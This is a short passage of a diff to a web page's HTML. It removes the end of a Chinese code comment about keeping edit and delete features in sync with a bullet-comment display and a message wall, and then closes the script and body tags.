-           5. 修改/删除功能保留，且数据与弹幕和留言墙完全同步。
-        */
     </script>
 </body>
 
